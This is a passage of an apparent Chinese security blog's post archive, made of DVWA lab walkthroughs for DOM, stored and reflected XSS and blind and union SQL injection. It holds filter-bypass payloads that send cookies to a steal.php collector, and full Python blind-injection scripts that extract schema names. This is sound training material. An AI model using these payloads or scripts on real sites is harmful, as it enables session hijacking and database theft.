value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;&lt;/form&gt;&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123; if(stripos($_GET[&apos;default&apos;],&apos;&lt;script&apos;) !== false)&#123; header(&quot;location:?default=English&quot;); &#125;&#125;?&gt; 可以看出在服务器端对GET的default值进行了过滤，一旦检测到defalut值中含有&lt;script，就立刻重定向到default值为English的页面 解决方法是利用字符#，该字符后的数据不会发送到服务器端，从而绕过服务器的过滤，输入 1#default=&lt;script&gt;alert(“xss”)&lt;/script&gt; 在输入 1#default=&lt;script src=”http://127.0.0.1/demo/xss(stored)/cookie.js”&gt;&lt;/script&gt; 成功窃取到cookie值 还有一种方法就是通过触发onerror事件来执行js代码 输入 1&lt;img src=# onerror=(alert(”xss”))&gt; 但是发现并没有弹框，为什么呢，仔细看一下代码发现img标签是包含在option标签里面的，所以img标签并不会被解析 这里要闭合option标签和select标签才可以解析出img标签 输入 1&lt;/option&gt;&lt;/select&gt;&lt;img src=# onerror=(alert(‘xss’))&gt; 成功弹框 但是因为我们提前闭合了option和select标签，所以后面的select结构都会被破坏，整个页面结构都被破坏了，所以这种方法并不是很实用 再试试通过onerror事件执行ajax代码，将cookie值发送给steal.php，然后写入数据库 输入 1&lt;img src=# onerror='var url=\"http://127.0.0.1/demo/xss(reflected)/steal.php\";var postStr=\"data=\"+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject(\"M&amp;#x69;crosoft.XMLHTTP\");&#125;else&#123;ajax=null;&#125;ajax.open(\"POST\", url, true);ajax.setRequestHeader(\"Content-Type\", \"appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded\");ajax.send(postStr);'&gt; 成功截取到cookie值 High代码复现如下： 123456789101112131415161718192021222324252627282930313233343536&lt;form name=&quot;XSS&quot; method=&quot;get&quot;&gt; &lt;p&gt;Please choose a language:&lt;/p&gt; &lt;select name=&quot;default&quot;&gt; &lt;script&gt; if(document.location.href.indexOf(&quot;default=&quot;)&gt;=0)&#123; var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot;+lang+&quot;&apos;&gt;&quot;+decodeURI(lang)+&quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); &#125; document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; &lt;/select&gt; &lt;input type=&apos;submit&apos; value=&apos;Select&apos;&gt;&lt;/form&gt;&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);if(array_key_exists(&apos;default&apos;,$_GET) &amp;&amp; $_GET[&apos;default&apos;] != NULL)&#123; $default=$_GET[&apos;default&apos;]; switch($default)&#123; case &apos;English&apos;:break; case &apos;French&apos;:break; case &apos;Spanish&apos;:break; case &apos;German&apos;:break; default:header(&quot;location:?default=English&quot;); &#125;&#125;?&gt; 可以看出default值如果不是选项中的四个值，就重定向到选项为English 跟上一关一样，依然可以采用字符#绕过过滤 输入 1?#default=&lt;script&gt;alert(“xss”)&lt;/script&gt; 成功弹框 输入 1?#default=&lt;script src=cookie.js&gt;&lt;/script&gt; 成功截取到cookie值","categories":[{"name":"dvwa-xss","slug":"dvwa-xss","permalink":"https://Foxgrin.github.io/categories/dvwa-xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"dvwa-xss(stored)","slug":"dvwa-xss(stored)","date":"2018-07-11T12:47:00.000Z","updated":"2018-07-11T13:33:57.097Z","comments":true,"path":"/posts/64824/","link":"","permalink":"https://Foxgrin.github.io/posts/64824/","excerpt":"总结了dvwa中的存储型xss关卡","text":"总结了dvwa中的存储型xss关卡 Low代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();setcookie('security','low',time()+3600);include(\"../sql-connection.php\");if(isset($_POST['btnSign']))&#123; $name=trim($_POST['txtName']); $message=trim($_POST['mtxMessage']); $message=stripslashes($message); $message=mysql_real_escape_string($message); $name=mysql_real_escape_string($name); $sql=\"INSERT INTO guestbook (comment,name) VALUES ('$message','$name')\"; $result=mysql_query($sql) or die(mysql_error());&#125;if(isset($_POST['btnClear']))&#123; $sql=\"DELETE FROM guestbook\"; $result=mysql_query($sql);&#125;$sql=\"SELECT name,comment FROM guestbook\";$result=mysql_query($sql);while($row=mysql_fetch_assoc($result))&#123; echo \"Name:\".$row['name'].\"&lt;br&gt;\"; echo \"Message:\".$row['comment'].\"&lt;br&gt;\";&#125;mysql_close();?&gt; 从代码可以看出将我们POST的name和message写入数据库，并且原原本本的输出存入数据库的name和message，所以很明显存在xss漏洞，这种属于存储型的xss，先将恶意脚本代码存入数据库中，然后用户每次访问网页时都会执行一次恶意代码 我们在name中输入 1&lt;script&gt;alert(“xss”)&lt;/script&gt; 再次刷新页面依然会跳出提示框 那么我们再按反射型xss关卡中的通过存入 1&lt;script src=”http://127.0.0.1/demo/xss(reflected)/cookie.js”&gt;&lt;/script&gt; 来跳转到steal.php 再将cookie值存入数据库的方法试一下 发现成功写入cookie值 但是再次刷新进入页面时，每次都会跳转回steal.php，并写入一次cookie值，这难免会引起用户的怀疑 这里可以采用ajax技术，即创建一个用javascript代码创建一个XMLHttpRequest对象，这个对象可以在后台与服务器交换数据，就不需要跳转到steal.php了 脚本如下： 12345678910111213var url = \"http://127.0.0.1/demo/xss(reflected)/steal.php\";var postStr = \"data=\"+document.cookie;var ajax = null;if (window.XMLHttpRequest) &#123; ajax = new XMLHttpRequest();&#125; else if (window.ActiveXObject) &#123; ajax = new ActiveXObject(\"Microsoft.XMLHTTP\");&#125; else &#123; ajax=null;&#125;ajax.open(\"POST\", url, true);ajax.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");ajax.send(postStr); 然后POST 每次访问页面都会讲cookie值写入数据库 Medium代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);include(&quot;../sql-connection.php&quot;);if(isset($_POST[&apos;btnSign&apos;]))&#123; $message=trim($_POST[&apos;mtxMessage&apos;]); $name=trim($_POST[&apos;txtName&apos;]); $message=strip_tags($message); $message=mysql_real_escape_string($message); $message=htmlspecialchars($message); $name=mysql_real_escape_string($name); $name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$name); $sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;; $result=mysql_query($sql); &#125;if(isset($_POST[&apos;btnClear&apos;]))&#123; $sql=&quot;DELETE FROM guestbook&quot;; $result=mysql_query($sql);&#125;$sql=&quot;SELECT name,comment FROM guestbook&quot;;$result=mysql_query($sql);while($row=mysql_fetch_assoc($result))&#123; echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;; echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;&#125;?&gt; 可以看出这关对message进行了丢弃标签的过滤，而且使用了htmlspecialchars这个函数，这个函数可以使html标签实体化，让标签不再是标签，完全防止了xss注入，所以这关只能在name注入，但是name同时也过滤了script标签，但是没事，跟之前关卡一样，我们可以采用双写绕过过滤 在name中输入 1&lt;s&lt;script&gt;cript&gt;alert(‘xss’)&lt;/script&gt; 成功弹窗 那么继续思考如何窃取cookie，答案就是双写 输入 1&lt;s&lt;script&gt;cript src=’cookie.js’&gt;&lt;/script&gt; 成功窃取到cookie值 High代码复现如下： 12345678910111213141516171819202122232425262728293031&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);include(&quot;../sql-connection.php&quot;);if(isset($_POST[&apos;btnSign&apos;]))&#123; $message=trim($_POST[&apos;mtxMessage&apos;]); $name=trim($_POST[&apos;txtName&apos;]); $message=strip_tags($message); $message=mysql_real_escape_string($message); $message=htmlspecialchars($message); $name=mysql_real_escape_string($name); $name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$name); $sql=&quot;INSERT INTO guestbook(comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;)&quot;; $result=mysql_query($sql); &#125;if(isset($_POST[&apos;btnClear&apos;]))&#123; $sql=&quot;DELETE FROM guestbook&quot;; $result=mysql_query($sql);&#125;$sql=&quot;SELECT name,comment FROM guestbook&quot;;$result=mysql_query($sql);while($row=mysql_fetch_assoc($result))&#123; echo &quot;Name:&quot;.$row[&apos;name&apos;].&quot;&lt;br&gt;&quot;; echo &quot;Message:&quot;.$row[&apos;comment&apos;].&quot;&lt;br&gt;&quot;;&#125;?&gt; 这里对name进行了正则匹配过滤掉了包含按顺序的&lt;,s,c,r,i,p,t字符组成的字符串，所以这里只能通过触发onerror事件来执行js代码 通过加载图片过程发生异常触发onerror事件 在name中输入 1&lt;image src=# onerror=(alert(‘xss’))&gt; 输入 1&lt;img src=# onerror='var url=\"http://127.0.0.1/demo/xss(reflected)/steal.php\";var postStr=\"data=\"+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest)&#123;ajax=new XMLHttpRequest();&#125;else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject)&#123;ajax=new Act&amp;#x69;veXObject(\"M&amp;#x69;crosoft.XMLHTTP\");&#125;else&#123;ajax=null;&#125;ajax.open(\"POST\", url, true);ajax.setRequestHeader(\"Content-Type\", \"appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded\");ajax.send(postStr);'&gt; 将ajax代码执行，将cookie值POST到steal.php 但在输入之前，我们应该先改一下数据列name的长度，之前设定长度为100，但是我们输入的明显超过了100,在mysql命令行输入 1alter table guestbook modify name varchar(500); 成功窃取到cookie值","categories":[{"name":"dvwa-xss","slug":"dvwa-xss","permalink":"https://Foxgrin.github.io/categories/dvwa-xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"dvwa-xss(reflected)","slug":"dvwa-xss(reflected)","date":"2018-07-11T11:42:00.000Z","updated":"2018-07-11T13:35:48.318Z","comments":true,"path":"/posts/52787/","link":"","permalink":"https://Foxgrin.github.io/posts/52787/","excerpt":"总结了dvwa中的反射型xss关卡","text":"总结了dvwa中的反射型xss关卡 Low代码复现如下： 12345678910&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;low&apos;,time()+3600);if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123; echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; 当我们GET一个name值以后，服务器毫无过滤的通过echo输出我们GET的name值，而如果我们输入的是一串代码，则这串代码通过echo就会被执行，这就是反射型的xss漏洞，我们可以通过GET方式输入一串js代码构造一个注入js代码的网页，当受害者访问这个url时，js代码将会自动实现，从而达到恶意攻击目的 比如我们输入 1&lt;script&gt;alert('xss')&lt;/script&gt; 于是我们可以利用这个xss漏洞获取服务器的cookie值，然后将cookie值存入数据库 先创建一个存放cookie的数据库 在mysql命令行输入： 12345678910111213create database dvwacookie;use dvwacookie;create table low(id int primary key,cookie varchar(100) ); 然后在编写一个cookie.js的脚本 这个脚本作用是创建隐藏表单，表单提交到steal.php，提交的内容是cookie值 接下来编写steal.php，自然就是将提交cookie值写入数据库里了 steal.php代码: 1234567891011&lt;?php$con=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);mysql_select_db(&apos;dvwacookie&apos;,$con);if(isset($_POST[&apos;data&apos;]))&#123; $sql=&quot;INSERT INTO low(cookie) VALUES (&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;)&quot;; $result=mysql_query($sql);&#125;?&gt; 然后回到存在xss漏洞的网页，通过GET传入name值 1&lt;script src=cookie.js&gt;&lt;/script&gt; 查看数据库 成功获得cookie值 Medium代码复现如下： 1234567891011&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;medium&apos;,time()+3600);if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123; $name=str_replace(&apos;&lt;script&gt;&apos;,&apos;&apos;,$_GET[&apos;name&apos;]); echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; 源代码利用了str_replace函数对script标签进行了过滤 不过没关系，因为函数只执行了一次，所以用双写的方法就可以很轻松的解决 输入 1&lt;s&lt;script&gt;cript&gt;alert('xss')&lt;/script&gt; 之后跟low关卡一样，输入 1&lt;s&lt;script&gt;cript src=cookie.js&gt;&lt;/script&gt; 获得cookie值 High代码复现如下： 1234567891011&lt;?phpsession_start();setcookie(&apos;security&apos;,&apos;high&apos;,time()+3600);if(array_key_exists(&apos;name&apos;,$_GET) &amp;&amp; $_GET[&apos;name&apos;] != NULL)&#123; $name=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;,&apos;&apos;,$_GET[&apos;name&apos;]); echo &apos;&lt;pre&gt;Hello &apos; . $name . &apos;&lt;/pre&gt;&apos;;&#125;?&gt; 这关利用了一个正则匹配过滤函数，i表示大小写，也就是以&lt;开头，以t结尾的字符串，只要中间按顺序包含&lt;script，则会立刻被过滤掉，之前双写绕过过滤的方法在这里行不通 绕过方法是采用触发onerror事件来执行javascript代码 onerror事件会在文档或者图像加载过程中发生错误时触发 例如，我们输入 1&lt;img src=# onerror=alert(“xss”)&gt; 果然，加载图片时发现不存在这个图片发生错误所以触发了onerror事件，然后执行了alert(“xss”)代码 那么我们再考虑怎么像之前两关一样获得cookie值 之前是通过script标签的src属性引用外部的cookie.js文件，将cookie值以POST形式传入steal.php，再将POST的cookie值写入数据库 但是很明显这关对script标签做了正则过滤，只要我们输入含有这几个字符，都会被过滤掉，所以这里可以用location.href跳转链接到steal.php，将cookie值写入数据库，所以这里只能用GET方式将cookie值传入steal.php 于是输入 1&lt;img src=# onerror=(location.href=”http://127.0.0.1/demo/xss(reflected)/steal.php?data=”+document.cookie)&gt; 但是结果却是 为什么呢 仔细检查发现我们输入里面 1&lt;img SrC=# oneRror=(locatIon.href=”httP://127.0.0.1/demo/xss(reflected)/steal.php?data=”+document.cookie)&gt; 大写字母构成了&lt;script，所以被过滤掉了 所以我们可以采用先获得cookie值，然后将cookie值传入steal.php 输入 1&lt;img src=# onerror=(alert(document.cookie))&gt; 在将这个cookie值传入steal.php 还有种方法是对某个关键过滤字符进行html编码，但是我亲测不行，不知道什么原因，还望大神指点原因","categories":[{"name":"dvwa-xss","slug":"dvwa-xss","permalink":"https://Foxgrin.github.io/categories/dvwa-xss/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://Foxgrin.github.io/tags/xss/"}]},{"title":"dvwa-sql(blind)","slug":"dvwa-sql(blind)","date":"2018-07-11T07:39:00.000Z","updated":"2018-07-11T10:36:59.664Z","comments":true,"path":"/posts/55409/","link":"","permalink":"https://Foxgrin.github.io/posts/55409/","excerpt":"总结了dvwa中的sql盲注关卡","text":"总结了dvwa中的sql盲注关卡 Low代码复现如下： 123456789101112131415161718&lt;?phpinclude(&quot;sql-connection.php&quot;);if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql); $row=mysql_fetch_array($result); if($row)&#123; echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; &#125; else&#123; echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 所谓的盲注，就是既没有报错信息，查询结果也始终如一甚至没有查询结果，也就是我们不知道会得到什么结果 我们就不能像之前一样自由选择注入方法，没有报错信息，也就是说报错注入不能用 没有查询结果，也就是说联合注入不能用 剩下的也就是盲注 盲注又可以分为基于时间的盲注和布尔型的盲注 从源代码来看，这关没有报错信息，查询结果为空和不为空返回的信息是不同的，我们就可以利用返回信息来判断有无返回结果 我们先输入1，发现有返回结果 再输入1’，发现没有返回结果 输入1’#，发现有返回结果 说明id被单引号包裹，然后1是有查询结果的，然后我们就可以通用 1’ and 后面的语句进行盲注 and 后面的语句如果为真，则有返回结果，and 后面语句为假，则没有返回结果，我们可以在mysql命令行里先试着模拟注入语句 把and后面的语句修改为注入的逻辑语句，这就是布尔型的盲注，举个例子，我们可以用布尔型盲注判断数据库名字的长度 输入1’ and length(database())=4# 而另一种基于时间的盲注，则是通过if(判断语句,1,sleep(5))来进行注入，如果判断语句为真，则不会sleep，为假则sleep 5秒 但是盲注的缺点就是一条一条试太麻烦了，这时候脚本的作用就体现出来了 我们先通过基于时间的盲注获取数据库名的长度 1234567891011for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break 这里r.elapsed.total_seconds()函数的作用是返回服务器接受请求到相应之间的时间，如果我们的判断语句length(database())=i 结果为真，则就不会sleep 5秒，t自然就小于5，就得到了数据库的长度 有了数据库名的长度，就可以获取数据库名 12345678910111213for i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break 先获取数据库名长度的作用就是用来一位一位的截取数据库名的字符进行判断，如果等于一个ascii值则t&lt;5，这样一位一位的得到数据库名的字符 同样的方法获取数据表的长度 12345678910111213for i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break 获取数据表名： 1234567891011121314151617for i in range(1,16): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is:',t) if(t&lt;3): table_name=table_name+chr(j) print('The name of table is:',table_name) flag=1 break else: if(j==122): table_name=table_name+',' 获取users表下数据列总长度： 12345678910for i in range(90,100): data=&#123; 'id':\"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_length=i print(column_length) break 这里用了布尔型的盲注，由于数据列总长度可能较长，所以变量i的区间是通过反复尝试出来的 获取数据列名： 1234567891011121314for i in range(1,95): for j in range(95,123): data=&#123; 'id':\"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_name=column_name+chr(j) print(\"The name of column is:\",column_name) break else: if(j==122): column_name=column_name+',' 总结：大部分sql注入都是得不到想要的结果，也没有报错信息的，所以大部分情况下我们都要进行盲注，而盲注就强烈推荐使用脚本，可以非常好的节约时间和精力 下面贴上本关完整的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import requestsurl='http://127.0.0.1/demo/sqli(blind)-low.php'database_length=0table_length=0column_length=0database=''table_name=''column_name=''#获取数据库长度:4for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break#获取数据库名:dvwafor i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break#获取所有数据表总长度:15for i in range(11,16): data=&#123; 'id':\"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print(t) if(t&lt;5): table_length=i print('The length of table is:',table_length) break#获取所有数据表名:guestbook,usersfor i in range(1,16): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) t=r.elapsed.total_seconds() print('the time of',chr(j),'is:',t) if(t&lt;3): table_name=table_name+chr(j) print('The name of table is:',table_name) flag=1 break else: if(j==122): table_name=table_name+','#获取所有数据列总长度:94for i in range(90,100): data=&#123; 'id':\"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#\"%i, 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_length=i print(column_length) break#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,passwordfor i in range(1,95): for j in range(95,123): data=&#123; 'id':\"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#\"%(i,j), 'submit':'Submit' &#125; r=requests.post(url,data=data) if('User ID exists in the database.' in r.text): column_name=column_name+chr(j) print(\"The name of column is:\",column_name) break else: if(j==122): column_name=column_name+',' Medium代码复现如下： 12345678910111213141516171819&lt;?phpinclude(&quot;sql-connection.php&quot;);if(isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $id=mysql_real_escape_string($id); $sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;; $result=mysql_query($sql); $row=mysql_fetch_array($result); if($row)&#123; echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; &#125; else&#123; echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 跟之前关卡区别只在于id未被引号包裹，稍微修改一下注入语句，跟之前关卡没什么区别，这里就不贴脚本了，参考上面的代码即可 High代码复现如下： 1234567891011121314151617181920&lt;?phpsession_start();include(&quot;sql-connection.php&quot;);if (isset($_SESSION[&apos;id&apos;]))&#123; $id=$_SESSION[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users where user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql); $row=mysql_fetch_array($result); if($row)&#123; echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;; &#125; else&#123; echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;; &#125;&#125;?&gt; 有两个页面，一个页面用来接收post的id值并赋值给session的id值，主页面接受session的id值进行查询 这里的脚本需要特别注意一点，因为是两个页面，所以要把post的数据提交给input页面，然后再访问index主页面，这就需要利用到requests库的Session对象 以获取数据库名长度为例子说明： 12345678910111213for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break 先创建一个Session对象，利用该对象将数据post到input页面，然后再通过Session对象访问index页面 其他的改法类似，就不一一赘述了 下面贴上本关完整脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113import requestsurl_input=\"http://127.0.0.1/demo/session-input.php\"url_index=\"http://127.0.0.1/demo/sqli(blind)-high.php\"database_length=0table_length=0column_length=0database=''table_name=''column_name=''#获取数据库长度:4for i in range(1,11): data=&#123; 'id':\"1' and if(length(database())=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() if(t&lt;5): database_length=i print('The length of database is:',database_length) break#获取数据库名:dvwafor i in range(1,5): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#\"%(i,j), 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() print('the time of',chr(j),'is',t) if(t&lt;5): database=database+chr(j) print('The name of database is:',database) break#获取所有数据表总长度:15for i in range(11,16): data=&#123; 'id':\"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() print(t) if(t&lt;5): table_length=i print('The length of table is:',table_length) break#获取所有数据表名:guestbook,usersfor i in range(1,16): for j in range(95,123): data=&#123; 'id':\"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#\"%(i,j), 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) t=r.elapsed.total_seconds() print('the time of',chr(j),'is:',t) if(t&lt;3): table_name=table_name+chr(j) print('The name of table is:',table_name) flag=1 break else: if(j==122): table_name=table_name+','#获取所有数据列总长度:94for i in range(90,100): data=&#123; 'id':\"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#\"%i, 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) if('User ID exists in the database.' in r.text): column_length=i print(column_length) break#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,passwordfor i in range(1,95): for j in range(95,123): data=&#123; 'id':\"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#\"%(i,j), 'submit':'Submit' &#125; s=requests.Session() s.post(url_input,data=data) r=s.get(url_index) if('User ID exists in the database.' in r.text): column_name=column_name+chr(j) print(\"The name of column is:\",column_name) break else: if(j==122): column_name=column_name+','","categories":[{"name":"dvwa-sql","slug":"dvwa-sql","permalink":"https://Foxgrin.github.io/categories/dvwa-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"dvwa-sql","slug":"dvwa-sql","date":"2018-07-10T13:44:00.000Z","updated":"2018-07-11T07:21:27.549Z","comments":true,"path":"/posts/39291/","link":"","permalink":"https://Foxgrin.github.io/posts/39291/","excerpt":"总结了dvwa中的sql注入关卡","text":"总结了dvwa中的sql注入关卡 Low代码复现如下： 1234567891011121314151617&lt;?phpinclude (&quot;sql-connection.php&quot;);if (isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;; $result=mysql_query($sql) or die(mysql_error()); while($row=mysql_fetch_assoc($result))&#123; $first=$row[&apos;first_name&apos;]; $last=$row[&apos;last_name&apos;]; echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125;&#125;?&gt; 这关毫无过滤的sql语句 提示输入id，判断可能是数字型注入 输入1 再输入1’ 出现报错，从错误信息判断是数字型注入，且被单引号包裹 输入1’# 没有报错 接下来判断查询字段数 输入1’ order by 3 说明查询字段数为2 那么就用联合查询来爆库 输入0’ union select database(),2 # 输入0’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database()# 爆表 输入0’ union select group_concat(column_name),2 from information_schema.columns where table_name=’users’# 爆列 输入0’ union select password,user_id from users # 爆数据 Medium代码复现如下： 1234567891011121314151617&lt;?phpinclude(&quot;sql-connection.php&quot;);if(isset($_POST[&apos;submit&apos;]))&#123; $id=$_POST[&apos;id&apos;]; $id=mysql_real_escape_string($id); $sql=&quot;SELECT first_name,last_name FROM users where user_id=$id&quot;; 